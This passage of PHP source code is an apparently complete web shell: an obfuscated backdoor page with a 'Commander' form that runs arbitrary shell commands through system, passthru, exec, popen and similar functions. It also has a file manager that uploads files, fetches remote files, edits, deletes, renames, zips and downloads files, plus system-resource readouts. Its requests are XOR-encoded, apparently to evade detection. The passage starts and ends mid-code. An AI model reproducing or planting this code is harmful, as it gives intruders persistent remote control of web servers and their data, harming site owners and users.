				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>";
		}
	}
	else
	{
		if($shell_exec == True)
		{
			$data = shell_exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round($data)."%</td>\n";
		}
		else if($exec == True)
		{
			$data = shell_exec("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'");
			echo "<td>".round($data)."%</td>\n";
		}
		else if($popen == true)
		{
			$pid = popen("grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'","r");
			$data = fread($pid, 2096);
			pclose($pid);
			echo "<td>".round($data)."%</td>\n";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				"grep 'cpu ' /proc/stat | awk '{usage=($2+$4)*100/($2+$4+$5)} END {print usage \"\"}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					echo "<td>".round($stdout)."%</td>\n";
				}	
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>\n";
		}	
	}

	echo "
	</tr>

	<tr>
		<td>Total RAM</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$wmi = new COM('WinMgmts:root/cimv2');
		$res = $wmi->ExecQuery('Select TotalPhysicalMemory from Win32_ComputerSystem');
		$system = $res->ItemIndex(0);
		printf(
			'<td>%d GB</td>', 
			$system->TotalPhysicalMemory / 1024 /1024 /1024
		);
	}
	else
	{
		if ($shell_exec == True)
		{
			$total_ram = shell_exec("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($exec == True)
		{
			$total_ram = exec("free -mt | grep Mem |awk '{print $2}'");
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($popen == true)
		{
			$pid = popen("free -mt | grep Mem |awk '{print $2}'","r");
			$total_ram = fread($pid, 2096);
			pclose($pid);
			$total_ram = $total_ram /1024;
			echo "<td>" . round($total_ram) . " GB</td>\n";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				"free -mt | grep Mem |awk '{print $2}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$total_ram = $stdout;
					$total_ram = $total_ram /1024;
					echo "<td>" . round($total_ram) . " GB</td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>";
		}	
	}

	echo "
	</tr>
	
	<tr>
		<td>Free RAM</td>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$free_ram = (int)str_replace("FreePhysicalMemory=", "", shell_exec("wmic OS get FreePhysicalMemory /Value")) /1024 /1024;
		echo "<td>" . round($free_ram, 2) . "GB </td>";
	}
	else
	{
		if ($shell_exec == True)
		{
			$free_ram = shell_exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($exec == True)
		{
			$free_ram = exec("free | grep Mem | awk '{print $3/$2 * 100.0}'");
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($popen == true)
		{
			$pid = popen("free | grep Mem | awk '{print $3/$2 * 100.0}'","r");
			$free_ram = fread($pid, 2096);
			pclose($pid);
			echo "<td>" . round($free_ram) . "% </td>\n";
		}
		else if($proc_open == true)
		{
			$process = proc_open(
				"free | grep Mem | awk '{print $3/$2 * 100.0}'",	
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($process !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($process);
		
				if ($stderr != "")
				{
					echo "<td></td>";
				}
				else
				{
					$free_ram = $stdout;
					echo "<td>" . round($free_ram) . "% </td>\n";
				}
			}
			else
			{
				echo "<td></td>";
			}
		}
		else
		{
			echo "<td></td>";
		}	
	}
	echo "
	</tr>";

	?>
</table>
</td>
</tr>
</table>

<?php

function command_exists($command)
{
	global $shell_exec, $exec, $popen, $proc_open;
	$whereIsCommand = (PHP_OS == 'WINNT') ? 'where' : 'which';

	$complete = "$whereIsCommand $command";

	if($shell_exec == true)
	{
		return shell_exec($complete);
	}
	else if($exec == true)
	{
		return exec($complete);
	}
	else if($popen == true)
	{
		$pid = popen($complete,"r");
		$result = fread($pid, 2096);
		pclose($pid);
		return $result;
	}
	else if($proc_open == true)
	{
		$process = proc_open(
			$complete,
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);

			return $stdout;
		}
		else
		{
			return "false";
		}
	}
	else
	{
		return "false";
	}
}

function evalRel($command)
{
	global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
	if ($system == True)
	{
		system($command);
	}
	else if($passthru == True)
	{
		passthru($command);
	}
	else if($shell_exec == True)
	{
		echo shell_exec($command);
	}
	else if($exec == True)
	{
		echo exec($command);
	}
	else if($popen == True)
	{
		$pid = popen( $command,"r");
		while(!feof($pid))
		{
			echo fread($pid, 256);
			flush();
	 		ob_flush();
			usleep(100000);
		}
		pclose($pid);
	}
	else if($proc_open == True)
	{
		$process = proc_open(
			$command,
			array(
				0 => array("pipe", "r"), //STDIN
				1 => array("pipe", "w"), //STDOUT
				2 => array("pipe", "w"), //STDERR
			),
			$pipes
		);

		if ($process !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($process);
		}

		if ($stderr != "")
		{
			echo $stderr;
		}
		else
		{
			echo $stdout;
		}
	}
}


echo "<br><h3><A NAME='File Manager' href='#File Manager'>File Manager</A></h3>";

function rrmdir($dir)
{
	if (is_dir($dir))
	{
		$objects = scandir($dir);
		foreach ($objects as $object)
		{ 
			if ($object != "." && $object != "..")
			{
				if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
			}
		}
		reset($objects);
		rmdir($dir);
	}
}

function getPermission($location)
{
	$perms = fileperms($location);

	if (($perms & 0xC000) == 0xC000)
	{
		$info = 's';
	}	
	elseif (($perms & 0xA000) == 0xA000)
	{
		$info = 'l';
	}	
	elseif (($perms & 0x8000) == 0x8000)
	{
		$info = '-';
	}	
	elseif (($perms & 0x6000) == 0x6000)
	{
		$info = 'b';
	}		
	elseif (($perms & 0x4000) == 0x4000)
	{
		$info = 'd';
	}	
	elseif (($perms & 0x2000) == 0x2000)
	{
		$info = 'c';
	}	
	elseif (($perms & 0x1000) == 0x1000)
	{
		$info = 'p';
	}	
	else
	{
		$info = 'u';
	}
	
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));

	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));

	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function sortRows($data)
{
	$size = count($data);

	for ($i = 0; $i < $size; ++$i)
	{
		$row_num = findSmallest($i, $size, $data);
		$tmp = $data[$row_num];
		$data[$row_num] = $data[$i];
		$data[$i] = $tmp;
	}

	return ( $data );
}

function findSmallest($i, $end, $data)
{
	$min['pos'] = $i;
	$min['value'] = $data[$i]['data'];
	$min['dir'] = $data[$i]['dir'];
	for (; $i < $end; ++$i)
	{
		if ($data[$i]['dir']) 
		{
			if ($min['dir'])
			{
				if ($data[$i]['data'] < $min['value'])
				{
					$min['value'] = $data[$i]['data'];
					$min['dir'] = $data[$i]['dir'];
					$min['pos'] = $i;
				}
			} 
			else
			{
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		} 
		else
		{
			if (!$min['dir'] && $data[$i]['data'] < $min['value'])
			{
				$min['value'] = $data[$i]['data'];
				$min['dir'] = $data[$i]['dir'];
				$min['pos'] = $i;
			}
		}
	}
	return ($min['pos']);
}

if(isset($_FILES["fileToUpload"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$target_dir = unxor_this($_GET["location"])."\\";
	}
	else
	{
		$target_dir = unxor_this($_GET["location"])."/";
	}
	$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
	$uploadOk = 1;

	if (file_exists($target_file))
	{
		$uploadOk = 0;
	}
	
	if ($uploadOk == 0)
	{
		echo "<p class='danger'>File with same name already exists.</p>";
	}	
	else
	{
		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file))
		{
			echo "<p class='success'>The file ".basename($_FILES["fileToUpload"]["name"])." has been uploaded.</p>";
			header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
		}
		else
		{
			echo "<p class='danger'>Sorry, there was an error uploading your file.</p>";
		}	
	}
}
else if(isset($_POST["linkToDownload"]))
{
	$url = $_POST["linkToDownload"];
	
	if ($url != "")
	{
		$pieces = explode("/", $url);
		$filename = array_pop($pieces);

		echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$target_dir = unxor_this($_GET["location"])."\\";
		}		
		else
		{
			$target_dir = unxor_this($_GET["location"])."/";
		}

		$fp = fopen ($target_dir.$filename, 'w+');

		$uploadOk = 1;
		if (file_exists($target_dir.$filename))
		{
			$uploadOk = 0;
		}
				
		if ($uploadOk == 0)
		{
			echo "<p class='danger'>File with same name already exists.</p>";
		}		
		else
		{
			try
			{
				if ($curl_version == True)
				{
					$ch = curl_init(str_replace(" ","%20",$url));

					curl_setopt($ch, CURLOPT_TIMEOUT, 60);

					curl_setopt($ch, CURLOPT_FILE, $fp);
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

					$data = curl_exec($ch);

					curl_close($ch);
				}
				else
				{
					file_put_contents($target_dir.$filename, file_get_contents($url));	
				}

				echo "<p class='success'>The file ".$filename." has been uploaded.</p>";
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
			}
			catch(Exception $e)
			{
				echo "<p class='danger'>Sorry, there was an error uploading your file.</p>";
			}	
		}
	}
	else
	{
		echo "<p class='danger'>Required Link not provided.</p>";
	}
}
else if(isset($_POST["mkdir"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$dirname = unxor_this($_GET["location"])."\\".$_POST["mkdir"];
	}
	else
	{	
		$dirname = unxor_this($_GET["location"])."/".$_POST["mkdir"];
	}

	if (!file_exists($dirname))
	{
		mkdir($dirname);
		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
	}
	else
	{
		echo "<p class='danger'>Dir already exists!</p>";
	}
}
else if(isset($_POST["mkfile"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = unxor_this($_GET["location"])."\\".$_POST["mkfile"];
	}
	else
	{
		$filename = unxor_this($_GET["location"])."/".$_POST["mkfile"];
	}

	if (!file_exists($filename))
	{
		fopen($filename, 'w');
		header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
	}
	else
	{
		echo "<p class='danger'>File already exists!</p>";
	}
}
else if(isset($_GET["del"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";
	if (is_dir(unxor_this($_GET["del"])))
	{
		rrmdir(unxor_this($_GET["del"]));
	}	
	else
	{
		unlink(unxor_this($_GET["del"]));
	}	
	echo "<p class='success'>".unxor_this($_GET["del"])." has been Deleted.</p>";
	header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
}
else if(isset($_GET["zip"]))
{
	echo "<a href='?dir=".$_GET["location"]."#File Manager'>Go Back</a>";

	$archiveName = unxor_this($_GET["zip"]);

	if (file_exists(unxor_this($_GET["zip"])))
	{
		if(is_dir(unxor_this($_GET["zip"])))
		{
			if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
			{	
				$folder = array_pop(explode("/", unxor_this($_GET['zip'])));

				$file = $folder . ".zip";
				
				zipWindows($file, unxor_this($_GET['zip']));

				chmod($file, 644);
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='.basename($file));
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				ob_clean();
				flush();
				readfile($file);	
			}
			else
			{
				if ($exec == True)
				{
					exec("zip -r $archiveName $archiveName");
				}				
				else if($shell_exec == True)
				{
					shell_exec("zip -r $archiveName $archiveName");
				}				
				else if($system == True)
				{
					system("zip -r $archiveName $archiveName");
				}
				else if($passthru == True)
				{
					 passthru("zip -r $archiveName $archiveName");
				}
				else if($popen == true)
				{
					$pid = popen("zip -r $archiveName $archiveName","r");
					pclose($pid);
				}
				else if($proc_open == true)
				{
					$process = proc_open(
						"zip -r $archiveName $archiveName",
						array(
							0 => array("pipe", "r"),
							1 => array("pipe", "w"),
							2 => array("pipe", "w"),
						),
						$pipes
					);

					if ($process !== false)
					{
						fclose($pipes[1]);
						fclose($pipes[2]);
						proc_close($process);
					}
					else
					{
						echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
						$zipFail = True;
					}
				}
				else
				{
					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system' and 'passthru' are Disabled.</p>";
					$zipFail = True;
				}

				if ($zipFail == False)
				{
					echo "<p class='success'>".unxor_this($_GET["zip"])." has been Ziped.</p>";
					header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["location"]);
				}	
			}
		}
		else
		{
			echo "<p class='danger'>This ain't no dir mate.</p>";
		}
	}
	else
	{
		echo "<p class='danger'>Dir doens't exist.</p>";
	}
}
else if(isset($_GET["file"]))
{
	if(isset($_POST["save"]))
	{
		if(is_writable(unxor_this($_GET["file"])))
		{
			file_put_contents(unxor_this($_GET["file"]), unxor_this($_POST["content"]));
			if(file_get_contents(unxor_this($_GET["file"])) == unxor_this($_POST["content"]))
			{
				echo "<p class='success'>Change was successful!</p>";
			}
			else
			{
				echo "<p class='danger'>Change was not successful!</p>";
			}		
		}
		else
		{
			echo "<p class='danger'>This file is not writable!</p>";
		}	
	}

	if(is_readable(unxor_this($_GET["file"])))
	{
		$file = unxor_this(htmlentities($_GET["file"]));
		$content = file_get_contents(unxor_this($_GET["file"]));
		echo "
			<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($_GET['file']))."#File Manager'>Go Back</a><br>
			<form action='".$_SERVER['PHP_SELF']."?file=".xor_this($file)."#File Manager' method='POST'>
				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>
				<input type='submit' name='save' value='Save' onclick='return xorencr5(this.form, this.form.content);'/>
			</form>";
	}
	else
	{
		echo "<p class='danger'>File is not readable!</p>";
	}
}
else if(isset($_GET["rename_file"]) && !empty($_GET["rename_file"]))
{
	echo "<a href='?dir=".$_GET["dir"]."#File Manager'>Go Back</a><br><br>";

	if(isset($_POST["rename_file"]))
	{
		if(file_exists(unxor_this($_POST["original_name"]))) 
		{
			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
			if(file_exists(unxor_this($_POST["new_name"])))
			{
				echo "<p class='success'>File successfully renamed!</p>";
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);
			}
			else
			{
				echo "<p class='danger'>Could not rename file!</p>";
			}		
		} 
		else
		{
			echo "<p class='danger'>Could not find file!</p>";
		}	
	}

	$rename = htmlentities(unxor_this($_GET["rename_file"]));
	echo "<form action='' method='POST'>
		<input type='hidden' name='original_name' value='$rename'>	
		<input type='text' name='new_name' value='$rename'>
		<input type=\"submit\" name=\"rename_file\" value=\"Rename\" onclick=\"return xorencr3(this.form, this.form.original_name, this.form.new_name);\"/>
	</form>";
}
else if(isset($_GET["rename_folder"]) && !empty($_GET["rename_folder"]))
{
	echo "<a href='?dir=".$_GET["dir"]."#File Manager'>Go Back</a><br><br>";

	if(isset($_POST["rename_folder"]))
	{
		if(file_exists(unxor_this($_POST["original_name"]))) 
		{
			rename(unxor_this($_POST["original_name"]), unxor_this($_POST["new_name"]));
			if(file_exists(unxor_this($_POST["new_name"])))
			{
				header("Location: http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF']."?dir=".$_GET["dir"]);			
				echo "<p class='success'>File successfully renamed!</p>";
			}
			else
			{
				echo "<p class='danger'>Could not rename file!</p>";
			}		
		}
		else
		{
			echo "<p class='danger'>Could not find file!</p>";
		}	
	}

	$rename = htmlentities(unxor_this($_GET["rename_folder"]));
	echo "<form action='' method='POST'>
		<input type='hidden' name='original_name' value='$rename'>	
		<input type='text' name='new_name' value='$rename'>
		<input type=\"submit\" name=\"rename_folder\" value=\"Rename\" onclick=\"return xorencr3(this.form, this.form.original_name, this.form.new_name);\"/>
	</form>";
}
else 
{
	if (isset($_GET['dir'])) 
	{
		if (isset($_GET['download']) && isset($_GET['location']))
		{
			if (is_readable(unxor_this($_GET['location'])))
			{
				$file = unxor_this($_GET['location']);
				header('Content-Description: File Transfer');
				header('Content-Type: application/octet-stream');
				header('Content-Disposition: attachment; filename='.basename($file));
				header('Expires: 0');
				header('Cache-Control: must-revalidate');
				header('Pragma: public');
				header('Content-Length: ' . filesize($file));
				ob_clean();
				flush();
				readfile($file);
			}
			else
			{
				echo "<p class='danger'>File is not readable!</p>";
			}		
		}
		$dir = unxor_this($_GET['dir']);
		$size = strlen($dir);
		while ($dir[$size - 1] == '/') 
		{
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
	}
	else
	{
		$dir = $_SERVER["SCRIPT_FILENAME"];
		$size = strlen($dir);
		while ($dir[$size - 1] != '/') 
		{
			$dir = substr($dir, 0, $size - 1);
			$size = strlen($dir);
		}
		$dir = substr($dir, 0, $size - 1);
	}

	if (is_dir($dir))
	{
		echo "
		<table class='flat-table flat-table-3'>
			<tr>
				<td>Shell's Directory: <a href='?dir=".xor_this(getcwd())."#File Manager'>".getcwd()."</a></td>
			</tr>
			<tr>
				<td>Current Directory: ".htmlspecialchars($dir)."</td>
			</tr>
			<tr>
				<td>Change Directory/Read File:
				<form action='#File Manager' method='get' >
					<input style='width:300px' name='dir' type='text' value='".htmlspecialchars($dir)."'/>
					<input type='submit' value='Change' name='Change' onclick='return xorencr4(this.form, this.form.dir);'/>
				</form>
				</td>
			</tr>
		</table>";


		if (is_readable($dir))
		{
			if ($handle = opendir($dir)) 
			{
				$rows = array();

				$size_document_root = strlen($_SERVER['DOCUMENT_ROOT']);
				$pos = strrpos($dir, "/");
				$topdir = substr($dir, 0, $pos + 1);
				$i = 0;
				while (false !== ($file = readdir($handle))) 
				{
					if ($file != "." && $file != "..") 
					{
						$rows[$i]['data'] = $file;
						$rows[$i]['dir'] = is_dir($dir . "/" . $file);
						$i++;
					}
				}
				closedir($handle);

				$size = count($rows);
				
				echo "
				<table class='flat-table flat-table-1'>
					<tr>
						<th>Type</th>
						<th>Name</th>
						<th>Size (bytes)</th>
						<th>Permissions</th>
						<th>Actions</th>
					</tr>

					<tr>
						<td>[UP]</td>
						<td><a href='", $_SERVER['PHP_SELF'], "?dir=", xor_this($topdir), "#File Manager'>..</a></td>
						<td></td>
						<td></td>
						<td></td>
					</tr>";

				if($size != 0)
				{
					$rows = sortRows($rows);

					for ($i = 0; $i < $size; ++$i)
					{
						$topdir = $dir . "/" . $rows[$i]['data'];
						echo "
						<tr>
							<td>";
						if ($rows[$i]['dir']) 
						{
							echo "[DIR]";
							$file_type = "dir";
						}
						else 
						{
							echo "[FILE]";
							$file_type = "file";
						}
						
						echo "
							</td>";
					
						if (is_readable($topdir))
						{					
							echo "
							<td><a href='", $_SERVER['PHP_SELF'], "?dir=", xor_this($topdir), "#File Manager'>", htmlspecialchars($rows[$i]['data']), "</a></td>";
						}						
						else
						{
							echo "
							<td>".htmlspecialchars($rows[$i]['data'])."</td>";
						}
							
						if (is_readable($topdir))
						{
							$locsize = filesize($topdir);
						}						
						else
						{
							$locsize = "";
						}
						
						echo "
							<td>".$locsize."</td>";
						echo "
							<td>".getPermission($topdir)."</td>";
						if ($file_type == "dir")
						{
							if (is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_folder=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?zip=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Zip</a></td>";
							}
							else
							{
								echo "
								<td></td>";
							}						
						}
						else
						{
							if (is_readable($topdir) && is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a> | <a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
							}							
							else if (is_readable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&download=".$rows[$i]['data']."&location=".xor_this($topdir)."'>Download File</a></td>";
							}							
							else if (is_writeable($topdir))
							{
								echo "
								<td><a href='".$_SERVER['PHP_SELF']."?file=".xor_this($topdir)."#File Manager'>Edit</a> | <a href='".$_SERVER['PHP_SELF']."?dir=".xor_this($dir)."&rename_file=".xor_this($topdir)."#File Manager'>Rename</a> | <a href='".$_SERVER['PHP_SELF']."?del=".xor_this($topdir)."&location=".xor_this($dir)."#File Manager'>Del</a></td>";
							}							
							else
							{
								echo "
								<td></td>";
							}
						}
						echo "
						</tr>";
					}
				}
				else
				{
					echo "
						<p class='danger'>Dir is Empty!</p>";
				}

				echo "
					</table>";

				if (!is_writeable($dir))
				{
					echo "
						<p class='danger'>Dir is not writeable! You can't upload files to this Directory!</p>
						
						<table class='flat-table flat-table-3' style='display:none'>\n";
				}				
				else
				{
					echo "<table class='flat-table flat-table-3'>";
			
				}				
				echo "
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post' enctype='multipart/form-data'>
							<td>Upload File (Browse):</td>
							<td><input type='file' value='Browse' name='fileToUpload'/></td>
							<td><input type='submit' value='Upload' name='uploadFile'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post' >
							<td>Upload File (Link):</td>
							<td><input style='width:300px' name='linkToDownload' type='text'/><br><small>Direct Links required!</small></td>
							<td><input type='submit' value='Upload' name='downloadLink'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post'>
							<td>Create File:</td>
							<td><input style='width:300px' name='mkfile' type='text'/></td>
							<td><input type='submit' value='Create' name='createFile'/></td>
						</form>
					</tr>
					<tr>
						<form action='?location=".xor_this($dir)."#File Manager' method='post'>
							<td>Create Folder:</td>
							<td><input style='width:300px' name='mkdir' type='text'/></td>
							<td><input type='submit' value='Create' name='createDir'/></td>
						</form>
					</tr>
				</table>";
			}
		}
		else
		{
			echo "<p class='danger'>Dir is not readable!</p>";
		}
	}
	else if (is_file($dir))
	{
		if(is_readable($dir))
		{
			$file = htmlentities($dir);
			$content = file_get_contents($dir);
			echo "
				<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($dir))."#File Manager'>Go Back</a><br>
				<textarea name='content'>".htmlspecialchars($content)."</textarea><br>";
		}
		else
		{
			echo "
				<a href='".$_SERVER['PHP_SELF']."?dir=".xor_this(dirname($dir))."#File Manager'>Go Back</a><br>
				<p class='danger'>File is not readable!</p>";
		}
	}
}


if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
{
echo "
<br><h3><A NAME='Commander' href=\"#Commander\">Commander</A></h3>
<form action='#Commander' method='POST'>";

if(isset($_POST["system"])) $_SESSION["command_function"] = "system";
if(isset($_POST["shell_exec"])) $_SESSION["command_function"] = "shell_exec";
if(isset($_POST["exec"])) $_SESSION["command_function"] = "exec";
if(isset($_POST["passthru"])) $_SESSION["command_function"] = "passthru";
if(isset($_POST["popen"])) $_SESSION["command_function"] = "popen";
if(isset($_POST["proc_open"])) $_SESSION["command_function"] = "proc_open";
if(!isset($_SESSION["command_function"])) $_SESSION["command_function"] = "system";
if($system == True)
{
	echo '<input type="submit" name="system" value="System" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system")
	{
		echo ' style="background-color: red;"';
	}	
	if(!isset($_SESSION["command_function"]))
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($shell_exec == True)
{
	echo '<input type="submit" name="shell_exec" value="Shell_exec" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shell_exec")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($exec == True)
{
	echo '<input type="submit" name="exec" value="Exec" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "exec")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($passthru == True)
{
	echo '<input type="submit" name="passthru" value="Passthru" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
	{
		echo ' style="background-color: red;"';
	}	
	
	echo "> ";
}

if($popen == true)
{
	echo '<input type="submit" name="popen" value="Popen" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "popen")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}

if($proc_open == true)
{
	echo '<input type="submit" name="proc_open" value="Proc_open" '; 
	
	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "proc_open")
	{
		echo ' style="background-color: red;"';
	}

	echo "> ";
}
echo "
</form>

<form action='#Commander' method='post'>
	<input type='text' style='width:300px' name='command' placeholder='Command...'>
	<input type=\"submit\" value=\"GO\" onclick=\"return xorencr(this.form, this.form.command);\" />
</form>";

if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "system" || isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "passthru")
{
	if(isset($_POST["command"]))
	{
		$decCommand = unxor_this($_POST["command"]);
		if($_SESSION["command_function"] == "system")
		{
			echo "<table class='flat-table flat-table-1'>";
			echo "<td>".$decCommand."</td>";
			echo "<td><pre>";
			system($decCommand." 2>&1");
			echo "</pre></td>";
			echo "</table>";
		}
		else
		{
			echo "<table class='flat-table flat-table-1'>";
			echo "<td>".$decCommand."</td>";
			echo "<td><pre>";
			passthru($decCommand." 2>&1");
			echo "</pre></td>";
			echo "</table>";		
		}
	}
}
else
{
	if(isset($_SESSION["directory"]))
	{
		if(file_exists($_SESSION["directory"]))
		{
			chdir($_SESSION["directory"]);
		}	
	}
	if(isset($_POST["command"]))
	{
		$decCommand = unxor_this($_POST["command"]);
		$parts = explode(" ", $decCommand);
		if($decCommand != "clear" && $decCommand != "cls" && $parts[0] != "cd")
		{
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shell_exec")
			{
				$response = shell_exec($decCommand." 2>&1");
			}
			
			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "exec")
			{
				$response = exec($decCommand." 2>&1");
			}

			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "popen")
			{
				$pid = popen($decCommand." 2>&1","r");
				$response = fread($pid, 2096);
				pclose($pid);
			}

			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "proc_open")
			{
				$process = proc_open(
					$decCommand." 2>&1",	
					array(
